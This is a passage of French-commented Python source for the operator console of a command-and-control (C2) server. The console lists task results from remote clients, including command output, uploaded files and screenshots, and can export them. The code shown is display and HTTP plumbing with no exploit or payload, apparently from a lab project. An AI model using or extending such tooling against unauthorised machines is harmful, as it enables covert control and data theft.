        status_emoji = "✅" if status == "success" else "❌"
        status_color = Fore.GREEN if status == "success" else Fore.RED

        # Formatter la date (même logique que dans view_results)
        if isinstance(received_at, (int, float)):
            # Timestamp Unix - convertir en string
            received_at_formatted = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(received_at))
        elif isinstance(received_at, str) and "T" in received_at:
            # Format ISO 8601
            received_at_formatted = received_at.split("T")[0] + " " + received_at.split("T")[1][:8]
        else:
            # Autre format ou N/A
            received_at_formatted = str(received_at) if received_at else "N/A"

        # Métadonnées
        print(f"\n{Fore.CYAN}Métadonnées:{Style.RESET_ALL}")
        print(f"  Task ID:    {task_id}")
        print(f"  Client ID:  {client_id}")
        print(f"  Status:     {status_color}{status_emoji} {status}{Style.RESET_ALL}")
        print(f"  Reçu le:    {received_at_formatted}")
        if error_message:
            print(f"  Erreur:     {Fore.RED}{error_message}{Style.RESET_ALL}")

        # Output
        lines = output.split("\n")
        chars_count = len(output)
        print(f"\n{Fore.CYAN}Output: ({len(lines)} lignes, {chars_count} caractères){Style.RESET_ALL}")
        print("-" * 100)

        # Gérer les cas spéciaux
        if output.startswith("[FILE_DATA]"):
            file_info = output[11:].split("|")[0] if "|" in output else "unknown"
            print(f"{Fore.MAGENTA}📁 Fichier uploadé: {file_info}{Style.RESET_ALL}")
        elif output.startswith("[SCREENSHOT"):
            print(f"{Fore.MAGENTA}📸 Screenshot sauvegardé (voir dossier uploads/){Style.RESET_ALL}")
        else:
            # Afficher l'output avec pagination si nécessaire
            if len(lines) <= 50:
                for line in lines:
                    print(line)
            else:
                self._paginate_output(lines)

        print("-" * 100)

        # Menu d'actions
        print(f"\n{Fore.CYAN}Actions:{Style.RESET_ALL}")
        print(f"  [e] Exporter vers fichier")
        print(f"  [0] Retour à la liste des résultats")

        action = input(f"\n{Fore.CYAN}Votre choix: {Style.RESET_ALL}").strip().lower()

        if action == "e":
            self._export_result(result)
        # Sinon retour automatique

    def _paginate_output(self, lines: List[str]) -> None:
        """
        Affiche l'output ligne par ligne avec pagination.
        Entrée = page suivante (30 lignes), 'q' = quitter.

        Args:
            lines: Liste des lignes à afficher
        """
        page_size = 30
        total_pages = (len(lines) + page_size - 1) // page_size
        current_page = 0

        while current_page < total_pages:
            start_idx = current_page * page_size
            end_idx = min(start_idx + page_size, len(lines))

            # Afficher les lignes de la page
            for line in lines[start_idx:end_idx]:
                print(line)

            current_page += 1

            # Si ce n'est pas la dernière page, demander confirmation
            if current_page < total_pages:
                print(f"\n{Fore.YELLOW}--- Page {current_page}/{total_pages} (Entrée = suite, q = quitter) ---{Style.RESET_ALL}")
                user_input = input().strip().lower()
                if user_input == 'q':
                    print(f"{Fore.YELLOW}(Affichage interrompu){Style.RESET_ALL}")
                    break
            else:
                print(f"\n{Fore.GREEN}--- Fin de l'output (page {current_page}/{total_pages}) ---{Style.RESET_ALL}")

    def _export_result(self, result: Dict[str, Any]) -> None:
        """
        Exporte un résultat vers un fichier texte.

        Args:
            result: Dictionnaire contenant le résultat
        """
        task_id = result.get("task_id", "unknown")[:8]
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        default_filename = f"result_{task_id}_{timestamp}.txt"

        filename = input(f"{Fore.CYAN}Nom du fichier [{default_filename}]: {Style.RESET_ALL}").strip()
        if not filename:
            filename = default_filename

        try:
            with open(filename, 'w', encoding='utf-8') as f:
                f.write("=" * 80 + "\n")
                f.write(f"RÉSULTAT C2 - Export {timestamp}\n")
                f.write("=" * 80 + "\n\n")
                f.write(f"Task ID:    {result.get('task_id', 'N/A')}\n")
                f.write(f"Client ID:  {result.get('client_id', 'N/A')}\n")
                f.write(f"Status:     {result.get('status', 'N/A')}\n")
                f.write(f"Reçu le:    {result.get('received_at', 'N/A')}\n")
                if result.get('error_message'):
                    f.write(f"Erreur:     {result.get('error_message')}\n")
                f.write("\n" + "=" * 80 + "\n")
                f.write("OUTPUT:\n")
                f.write("=" * 80 + "\n\n")
                f.write(result.get('output', ''))
                f.write("\n")

            print(f"\n{Fore.GREEN}✅ Résultat exporté vers: {filename}{Style.RESET_ALL}")
        except Exception as e:
            print(f"\n{Fore.RED}❌ Erreur lors de l'export: {e}{Style.RESET_ALL}")

        self._wait_for_enter()

    def _check_server_connection(self) -> bool:
        """
        Vérifie que le serveur est accessible.

        Returns:
            True si le serveur répond, False sinon.
        """
        try:
            response = requests.get(
                f"{self.server_url}/",
                timeout=REQUEST_TIMEOUT
            )
            return response.status_code == 200
        except Exception:
            return False

    def _make_request(
        self,
        method: str,
        endpoint: str,
        data: Optional[Dict[str, Any]] = None,
        silent: bool = False
    ) -> Optional[Dict[str, Any]]:
        """
        Effectue une requête HTTP vers le serveur.

        Args:
            method: Méthode HTTP (GET, POST, etc.).
            endpoint: Endpoint de l'API (ex: "/clients").
            data: Données JSON à envoyer (pour POST).
            silent: Si True, n'affiche pas les erreurs (utile pour polling).

        Returns:
            Dictionnaire de la réponse JSON ou None en cas d'erreur.
        """
        url = f"{self.server_url}{endpoint}"

        try:
            if method == "GET":
                response = requests.get(url, timeout=REQUEST_TIMEOUT)
            elif method == "POST":
                response = requests.post(
                    url,
                    json=data,
                    headers={"Content-Type": "application/json"},
                    timeout=REQUEST_TIMEOUT
                )
            else:
                if not silent:
                    print(f"{Fore.RED}❌ Méthode HTTP non supportée: {method}{Style.RESET_ALL}")
                    self._wait_for_enter()
                return None

            # Vérifier le code de réponse
            if response.status_code in [200, 201]:
                return response.json()
            else:
                if not silent:
                    print(f"\n{Fore.RED}❌ Erreur serveur (HTTP {response.status_code}){Style.RESET_ALL}")
                    try:
                        error_data = response.json()
                        error_msg = error_data.get("error", "Erreur inconnue")
                        print(f"{Fore.RED}   Détails: {error_msg}{Style.RESET_ALL}")
                    except Exception:
                        print(f"{Fore.RED}   Réponse: {response.text[:200]}{Style.RESET_ALL}")
                    self._wait_for_enter()
                return None

        except requests.exceptions.Timeout:
            if not silent:
                print(f"\n{Fore.RED}❌ Timeout: Le serveur ne répond pas.{Style.RESET_ALL}")
                self._wait_for_enter()
            return None
        except requests.exceptions.ConnectionError:
            if not silent:
                print(f"\n{Fore.RED}❌ Erreur de connexion: Impossible de joindre le serveur.{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}   Vérifiez que le serveur est démarré sur {self.server_url}{Style.RESET_ALL}")
                self._wait_for_enter()
            return None
        except Exception as e:
            if not silent:
                print(f"\n{Fore.RED}❌ Erreur inattendue: {e}{Style.RESET_ALL}")
                self._wait_for_enter()
            return None

    def _clear_screen(self) -> None:
        """
        Efface l'écran du terminal (cross-platform).

        Utilise 'cls' sur Windows et 'clear' sur Unix/Linux.
        """
        os.system("cls" if os.name == "nt" else "clear")

    def _print_table(self, headers: List[str], rows: List[List[str]]) -> None:
        """
        Affiche un tableau formaté avec bordures.

        Args:
            headers: Liste des en-têtes de colonnes.
            rows: Liste de listes représentant les lignes de données.
        """
        # Calculer la largeur de chaque colonne
        col_widths = []
        for i, header in enumerate(headers):
            max_width = len(header)
            for row in rows:
                if i < len(row):
                    # Retirer les codes ANSI pour calculer la vraie longueur
                    cell_text = self._strip_ansi(row[i])
                    max_width = max(max_width, len(cell_text))
            col_widths.append(max_width + 2)  # Padding

        # Ligne du haut
        print("┌" + "┬".join("─" * width for width in col_widths) + "┐")

        # En-têtes
        header_row = "│"
        for i, header in enumerate(headers):
            header_row += f" {header.ljust(col_widths[i] - 2)} │"
        print(header_row)

        # Ligne de séparation
        print("├" + "┼".join("─" * width for width in col_widths) + "┤")

        # Lignes de données
        for row in rows:
            data_row = "│"
            for i, cell in enumerate(row):
                # Calculer le padding en tenant compte des codes ANSI
                cell_text_clean = self._strip_ansi(cell)
                padding = col_widths[i] - len(cell_text_clean) - 2
                data_row += f" {cell}{' ' * padding} │"
            print(data_row)

        # Ligne du bas
        print("└" + "┴".join("─" * width for width in col_widths) + "┘")

    def _strip_ansi(self, text: str) -> str:
        """
        Supprime les codes ANSI d'une chaîne de caractères.

        Args:
            text: Texte contenant potentiellement des codes ANSI.

        Returns:
            Texte sans codes ANSI.
        """
        import re
        ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
        return ansi_escape.sub('', text)

    def _wait_for_enter(self) -> None:
        """
        Attend que l'utilisateur appuie sur Entrée.
        """
        input(f"\n{Fore.CYAN}Appuyez sur Entrée pour continuer...{Style.RESET_ALL}")


def main() -> None:
    """
    Point d'entrée principal du programme.

    Parse les arguments en ligne de commande et démarre la console.
    """
    parser = argparse.ArgumentParser(
        description="Console d'administration C2 pour la gestion réseau",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Exemples d'utilisation:
  python cli.py                                    # Connexion à localhost:8080
  python cli.py --server http://192.168.56.1:8080  # Connexion à un serveur distant
  python cli.py -s http://10.0.0.1:9000            # Version courte
        """
    )
    parser.add_argument(
        "--server", "-s",
        default=DEFAULT_SERVER_URL,
        help=f"URL du serveur C2 (défaut: {DEFAULT_SERVER_URL})"
    )

    args = parser.parse_args()

    try:
        console = C2Console(server_url=args.server)
        console.run()
    except KeyboardInterrupt:
        print(f"\n\n{Fore.YELLOW}⚠️  Programme interrompu par l'utilisateur{Style.RESET_ALL}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Fore.RED}❌ Erreur fatale: {e}{Style.RESET_ALL}")
        sys.exit(1)


if __name__ == "__main__":
    main()
